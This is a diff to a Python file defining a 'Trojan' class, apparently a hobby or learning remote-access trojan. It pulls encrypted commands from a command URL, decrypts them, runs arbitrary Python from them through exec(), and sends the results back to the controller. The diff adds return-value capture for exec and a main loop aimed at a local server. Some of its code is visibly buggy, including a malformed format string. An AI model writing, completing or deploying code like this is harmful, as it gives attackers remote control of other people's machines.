@@ -1,4 +1,4 @@
-contents = import urllib.request as request
+import urllib.request as request
 import urllib.parse as parse
 from urllib.parse import quote, unquote
 
@@ -7,6 +7,7 @@ import os
 import sys
 import random
 import base64
+import platform
 
 
 
@@ -61,13 +62,12 @@ class Trojan:
         self.headers.update(headers) #concatenates two dictionaries
     
     def commands(self) -> dict:
+        print('[*] <- recieving commands')
         req = request.Request(self.commandurl, headers = self.headers)
         with request.urlopen(req) as response:
             encryptedresponse = response.read()
             encryptedresponse = encryptedresponse.decode()
-        print(encryptedresponse)
         decryptedresponse = decrypt(encryptedresponse)
-        print(decryptedresponse)
         commands = ''
         try:
             commands = json.loads(decryptedresponse)
@@ -138,10 +138,21 @@ class Trojan:
             elif key.lower() == 'python':
                 for value in values:
                     try:
-                        exec(value)
-                        output = 'executed %s correctly' % value
+                        if '()' in value:
+                            loc = {}
+                            exec('output = %s' % value, globals(), loc)
+                            output = loc['output']
+                        else:
+                            exec(value)
+                            output = ('executed "%"s correctly' % value)
                     except Exception as e:
                         output = e
                     outcomes['python'].append([value, output])
         outcomes = str(outcomes)
         self.sendoutcome(outcomes)
+        
+if __name__ == '__main__':
+    trojan = Trojan('http://127.0.0.1:8000', computerid='dht-11')
+    while True:
+        input('Enter to run')
+        trojan.run()
